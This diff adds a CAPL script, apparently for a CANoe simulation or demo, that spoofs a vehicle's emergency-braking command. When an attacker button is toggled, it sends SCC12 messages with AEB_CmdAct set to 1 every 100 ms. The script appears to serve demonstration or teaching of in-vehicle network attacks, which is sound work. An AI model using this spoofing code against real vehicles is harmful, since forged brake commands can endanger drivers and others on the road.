@@ -1,0 +1,80 @@
+﻿/*@!Encoding:65001*/
+
+/**
+ * @file
+ * @brief CAPL script to handle spoofing messages and control visibility based on attack status.
+ */
+
+includes
+{
+    // Include any required headers or libraries here.
+}
+
+variables
+{
+    /// Timer for periodic message handling and control visibility updates.
+    msTimer msTimerEvent;
+
+    /// Flag indicating whether spoofing is active.
+    int64 spoofMsg = 0;
+
+    /// SCC12 message PDU for sending spoofed data.
+    message SCC12 scc12Pdu;
+}
+
+/**
+ * @brief Timer event handler for sending spoofed messages and updating control visibility.
+ */
+on timer msTimerEvent
+{
+    // Check if spoofing is active and update message PDU and control visibility accordingly.
+    if (spoofMsg == 1)
+    {
+        scc12Pdu.AEB_CmdAct = 1;
+        setControlVisibility("ECUs_ON_BUS", "Flash", 1);
+        output(scc12Pdu);
+    }
+    else
+    {
+        setControlVisibility("ECUs_ON_BUS", "Flash", 0);
+    }
+
+    // Set the timer for the next event.
+    setTimer(msTimerEvent, 100);
+}
+
+/**
+ * @brief Initialization event, sets up initial control visibility and timer.
+ */
+on start
+{
+    // Set initial visibility for attacker-related controls.
+    setControlVisibility("ECUs_ON_BUS", "attacker_pic", 1);
+    setControlVisibility("ECUs_ON_BUS", "Attacker_btn", 1);
+
+    // Set up the timer for periodic events.
+    setTimer(msTimerEvent, 100);
+}
+
+/**
+ * @brief System variable event handler for toggling spoofing status.
+ */
+on sysvar Attacker::attacker_btn
+{
+    // Toggle the spoofing flag and update system variable.
+    if (@this == 1)
+    {
+        spoofMsg = !spoofMsg;
+        @Attacker::SpoofMsg = spoofMsg;
+    }
+
+    // Log the current spoofing status.
+    if (spoofMsg)
+    {
+        write("Attacker is spoofing brake signal");
+    }
+    else
+    {
+        write("Attacker stopped spoofing brake signal");
+    }
+}
